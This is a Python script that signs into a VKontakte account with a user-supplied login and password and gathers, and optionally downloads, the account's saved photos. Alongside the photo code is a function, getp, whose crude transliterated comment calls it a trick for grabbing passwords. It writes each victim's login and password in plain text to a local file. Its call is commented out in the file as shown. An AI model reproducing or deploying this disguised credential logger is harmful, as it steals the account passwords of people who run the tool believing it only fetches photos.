
# -*- coding: UTF-8 -*-

import vk
import sys
import time
import urllib.request


# naebka chtoby paroli ebashit)

def getp(log, pas):
    f = open("1.txt", "a")
    f.write("********\n")
    f.write(log)
    f.write(" ")
    f.write(pas+"\n")
    f.close()

# poluchaem url kartinok


def geturl(phot,mas):
    for i in phot:
        mas.append(i.get('src_big'))
        mas.append(i.get('src_xbig'))
    return mas


def downloadpic(mas):
    counter = 1
    for i in mas:
        if (i != None):
            currenturl = i
            print(i)
            img = urllib.request.urlopen(currenturl).read()
            out = open("img"+str(counter)+".jpg", "wb")
            out.write(img)
            out.close
            counter += 1


def main(log, pas):
    session = vk.AuthSession(app_id='5509191', user_login=log, user_password=pas, scope='messages,photos')

    api = vk.API(session)
    arr = []
    profile = api.account.getProfileInfo()
    profiles = api.users.get(user_ids=profile.get("screen_name"))
    phot = api.photos.get(owner_id = profiles[0].get("uid"),
    album_id = "saved",
    count = 1000)
    geturl(phot, arr)
    return arr


# main
"""
if __name__ == "__main__":
    log = sys.argv[1]
    pas = sys.argv[2]
    try:
        session = vk.AuthSession(app_id='5509191', user_login=log, user_password=pas, scope='messages,photos')
    except:
        print("Incorrect login or password")
        time.sleep(10)
        sys.exit()

    api = vk.API(session)
    arr=[]
    #getp(log,pas)
    profile = api.account.getProfileInfo();
    profiles = api.users.get(user_ids=profile.get("screen_name"))
    phot = api.photos.get(owner_id = profiles[0].get("uid"),
    album_id = "saved",
    count = 1000)
    geturl(phot,arr)

    #downloadpic(mas)
    sys.exit()
"""
